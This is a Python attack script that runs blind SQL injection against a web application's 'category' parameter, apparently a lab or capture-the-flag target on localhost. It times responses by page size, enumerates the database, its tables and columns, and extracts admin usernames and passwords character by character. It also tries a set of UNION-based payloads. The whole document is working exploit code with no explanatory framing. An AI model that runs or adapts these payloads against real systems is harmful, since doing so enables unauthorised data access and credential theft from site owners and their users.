import requests
import urllib.parse
import time

# Target configuration
target = "http://127.0.0.1:32780/"
session = requests.Session()
session.cookies.set('PHPSESSID', 'a619c2d322b0d2025997d9751eb6d09a')

print("[+] Blind SQL Injection Data Extraction")
print(f"[+] Target: {target}")

# Baseline measurements
r_true = session.get(f"{target}?category={urllib.parse.quote(\"Nature' AND '1'='1\")}")
r_false = session.get(f"{target}?category={urllib.parse.quote(\"Nature' AND '1'='2\")}")
true_size = len(r_true.text)
false_size = len(r_false.text)

print(f"[+] Baseline - True condition: {true_size} bytes")
print(f"[+] Baseline - False condition: {false_size} bytes")
print(f"[+] Size difference confirms blind injection viable")

def blind_extract(query, length=50):
    """Extract data via blind SQL injection"""
    extracted = ""
    print(f"[+] Extracting: {query[:60]}...")
    
    for position in range(1, length + 1):
        char_found = False
        for ascii_val in range(32, 127):  # Printable ASCII range
            # Test if character at position equals ascii_val
            payload = f"Nature' AND ASCII(SUBSTRING(({query}),{position},1))={ascii_val}--"
            r = session.get(f"{target}?category={urllib.parse.quote(payload)}")
            
            if len(r.text) == true_size:
                extracted += chr(ascii_val)
                print(f"[+] Position {position}: '{chr(ascii_val)}' (ASCII {ascii_val})")
                char_found = True
                break
                
        if not char_found:
            # If we hit a non-printable, we might be at the end
            print(f"[+] End of data reached at position {position-1}")
            break
            
    return extracted

# Extract database structure
print("\n[+] Phase 1: Enumerating database structure")

db_name = blind_extract("SELECT database()", 20)
print(f"[+] Database name: '{db_name}'")

# Extract table names
tables = []
print("\n[+] Phase 2: Extracting table names")

for i in range(0, 5):  # Get first 5 tables
    table_name = blind_extract(f"SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {i},1", 30)
    if table_name:
        tables.append(table_name)
        print(f"[+] Table {i}: '{table_name}'")

# Extract columns from admins table
if 'admins' in tables or 'Admins' in tables:
    table_to_use = 'admins' if 'admins' in tables else 'Admins'
    print(f"\n[+] Phase 3: Extracting columns from {table_to_use} table")
    
    columns = []
    for i in range(0, 5):  # Get first 5 columns
        col_name = blind_extract(f"SELECT column_name FROM information_schema.columns WHERE table_name='{table_to_use}' LIMIT {i},1", 30)
        if col_name:
            columns.append(col_name)
            print(f"[+] Column {i}: '{col_name}'")
    
    # If we found username and password columns, extract admin credentials
    if 'username' in columns and 'password' in columns:
        print("\n[+] Phase 4: Extracting admin credentials")
        
        username = blind_extract(f"SELECT username FROM {table_to_use} LIMIT 1", 50)
        password = blind_extract(f"SELECT password FROM {table_to_use} LIMIT 1", 50)
        
        print(f"\n[!] ADMIN CREDENTIALS FOUND:")
        print(f"[!] Username: {username}")
        print(f"[!] Password: {password}")
        
    elif 'admin_user' in columns and 'admin_pass' in columns:
        print("\n[+] Phase 4: Extracting admin credentials (alternate column names)")
        
        username = blind_extract(f"SELECT admin_user FROM {table_to_use} LIMIT 1", 50)
        password = blind_extract(f"SELECT admin_pass FROM {table_to_use} LIMIT 1", 50)
        
        print(f"\n[!] ADMIN CREDENTIALS FOUND:")
        print(f"[!] Username: {username}")
        print(f"[!] Password: {password}")

# Try UNION-based approach with different syntax
print("\n[+] Phase 5: Attempting alternative UNION syntax")

# Try UNION without comment terminator
union_payloads = [
    "' UNION SELECT 1,2,3,4,5",
    "' UNION SELECT username,password FROM admins",
    "' UNION SELECT null,username,password,null,null FROM admins",
    "' UNION SELECT 1,version(),database(),user(),5",
    "' UNION SELECT table_name,null,null,null,null FROM information_schema.tables WHERE table_schema=database()--"
]

for payload in union_payloads:
    r = session.get(f"{target}?category={urllib.parse.quote(payload)}")
    print(f"[+] Testing: {payload[:50]}...")
    print(f"[+] Size: {len(r.text)} bytes")
    
    if "error" not in r.text.lower() and len(r.text) not in (true_size, false_size):
        print(f"[!] Different response - potential data extraction:")
        print(f"[!] Response:\n{r.text}")
        break

print("\n[+] Blind extraction complete")
